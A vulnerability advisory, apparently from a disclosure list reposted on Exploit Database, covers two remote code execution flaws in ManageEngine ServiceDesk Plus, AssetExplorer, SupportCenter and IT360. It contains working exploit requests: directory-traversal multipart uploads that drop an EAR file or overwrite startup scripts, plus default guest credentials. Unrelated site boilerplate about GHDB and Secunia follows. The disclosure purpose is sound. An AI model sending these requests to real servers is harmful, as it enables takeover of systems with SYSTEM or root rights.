# [The ManageOwnage Series, part XI]: Remote code execution in ServiceDesk, Asset Explorer, Support Center and IT360

---

*From*: Pedro Ribeiro <pedrib () gmail com>

Hi,

This is part 11 of the ManageOwnage series. For previous parts, see [1].

This time we have two remote code execution via file upload (and
directory traversal) on several ManageEngine products - Service Desk
Plus, Asset Explorer, Support Center and IT360.

The first vulnerability can only be exploited by an authenticated
user, but it can be a low privileged guest (which is a default account
present in almost all installations). This vulnerability can be abused
to drop an EAR file in the JBOSS directory which gets deployed
automatically, giving code execution as SYSTEM / root.

The second vulnerability allows you to perform an unauthenticated
upload to anywhere in the file system with SYSTEM / root privileges.
However only text files are handled correctly, as the servlet mangles
binary files.

Given the prevalence of guest / low privileged / default accounts in
these products, the first vulnerability is by far the most
interesting. I've released a Metasploit module which exploits it for
all products. It should hopefully be integrated soon into Metasploit
[2].

The full text of the advisory is below, and a copy can be obtained in
my PoC repo [3].

Regards,
Pedro

#1
Vulnerability: Remote code execution via file upload and directory
traversal (authenticated)
CVE-2014-5301
Constraints: user login needed, but exploitable with the default low
privilege guest account (u:guest/p:guest)
Affected versions (inclusive): ServiceDesk Plus / Plus MSP v5 to v9.0
v9030; AssetExplorer v4 to v6.1; SupportCenter v5 to v7.9; IT360 v8 to
v10.4

POST /common/FileAttachment.jsp
POST /workorder/Attachment.jsp (older versions < v7 build 7016;
AssetExplorer v4; all SupportCenter versions)

It is possible to abuse a directory traversal vulnerability when
uploading attachments. A Metasploit module that exploits this
vulnerability has been released.
Post data has to be formatted as a multi-part request with an embedded
ear file. Below is the form data for the newer versions:

Content-Type: multipart/form-data;
boundary=---------------------------9313517619947
Content-Length: 1337

-----------------------------9313517619947
Content-Disposition: form-data; name="module"

../../server/default/deploy
-----------------------------9313517619947
Content-Disposition: form-data; name="filePath"; filename="whatever.ear"
Content-Type: application/octet-stream

<...EAR file here...>

-----------------------------9313517619947
Content-Disposition: form-data; name="att_desc"

-----------------------------9313517619947--

#2
Vulnerability: Remote code execution via file upload (unauthenticated)
CVE-2014-5302
Constraints: no authentication or any other information needed except
for IT360 (guest account needed); code execution is only possible by
replacing one of the <install_dir>bin/ scripts and waiting for them to
be executed or for a periodic task to run. This is because only text
files can be uploaded as binary files are mangled; and there no JSP
compiler in the $PATH.
Affected versions: ServiceDesk Plus / Plus MSP v7.6 to v9.0 build
9026; AssetExplorer v? to v6.1 build 6106; IT360 v? to v10.4

POST /discoveryServlet/WsDiscoveryServlet?computerName=../bin/run.bat%00
POST /discoveryServlet/WsDiscoveryServlet?computerName=../bin/backUpData.bat%00
<...text file / script payload here...>

```
> > ```
> > Fix:
> >
> > ```

```
#1 is fixed on ServiceDesk Plus 9.0 build 9031. It is UNFIXED on all
other products. Disclosure to ManageEngine was done on 04/08/2014, so
over 150 days have elapsed. The last communication I received from
them was that "Once we released this fix in ServiceDesk plus, we
eventually take this in other products like AssetExplorer and
SupportCenter."

#2 is fixed on ServiceDesk Plus 9.0 build 9027 and on AssetExplorer
6.1 build 6107. It is UNFIXED for IT360.

        This module exploits a directory traversal vulnerability in ManageEngine ServiceDesk,
        AssetExplorer, SupportCenter and IT360 when uploading attachment files. The JSP that accepts
        the upload does not handle correctly '../' sequences, which can be abused to write
        in the file system. Authentication is needed to exploit this vulnerability, but this module
        will attempt to login using the default credentials for the administrator and guest
        accounts. Alternatively you can provide a pre-authenticated cookie or a username / password
        combo. For IT360 targets enter the RPORT of the ServiceDesk instance (usually 8400). All
        versions of ServiceDesk prior v9 build 9031 (including MSP but excluding v4), AssetExplorer,
        SupportCenter and IT360 (including MSP) are vulnerable. At the time of release of this
        module, only ServiceDesk v9 has been fixed in build 9031 and above. This module has been
        been tested successfully in Windows and Linux on several versions.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.
